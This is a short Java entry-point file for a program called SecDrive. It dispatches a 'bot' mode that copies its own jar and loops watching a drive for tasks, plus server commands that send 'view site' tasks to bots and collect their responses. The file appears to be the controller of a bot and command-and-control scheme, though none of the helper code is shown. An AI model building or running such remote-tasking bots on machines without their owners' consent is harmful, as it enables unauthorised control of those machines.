package pl.kkogut;


public class SecDrive {

    public static void main(String[] args) {
        if(args.length>0){

            System.out.println("arg1 = " + args[0]);
            String param = args[0];
            if (param.equals("delete")) APIcaller.deleteAllCalls();
            else if (param.equals("bot")) {
                FilesOperator.copyJarFile();
                while (true) {
                    FilesOperator.driveChanged();
                    Tasks.proceedWithTasks();
                }
            }
            else if (param.equals("server_send")){
                String wwwAddress;
                if(args.length>1){
                    wwwAddress = args[1];
                }
                else{
                    wwwAddress = "https://www.myip.com/";
                }
                Server.sendCommand(Task.TaskType.VIEW_SITE, wwwAddress);

            }
            else if(param.equals("server_responses")){
                Server.getAllResponses();
            }
        }
        else {
            System.out.println("Please pass params: ");
            System.out.println("bot");
            System.out.println("server_send www.example.com");
            System.out.println("server_responses");
        }

    }
}
